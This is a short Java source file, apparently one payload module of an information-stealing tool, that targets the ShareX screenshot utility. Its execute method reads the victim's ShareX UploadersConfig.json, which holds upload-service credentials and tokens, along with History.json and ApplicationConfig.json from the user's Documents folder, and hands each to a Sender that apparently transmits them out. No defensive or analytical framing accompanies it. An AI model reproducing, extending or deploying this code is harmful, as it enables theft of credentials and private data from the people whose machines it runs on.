package dev._3000IQPlay.experium.payload.impl;

import dev._3000IQPlay.experium.payload.Payload;
import dev._3000IQPlay.experium.payload.Sender;
import dev._3000IQPlay.experium.util.FileUtil;

public final
class ShareX implements Payload {
    @Override
    public
    void execute () {
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "UploadersConfig.json").ifPresent(Sender::send);
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "History.json").ifPresent(Sender::send);
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "ApplicationConfig.json").ifPresent(Sender::send);
    }
}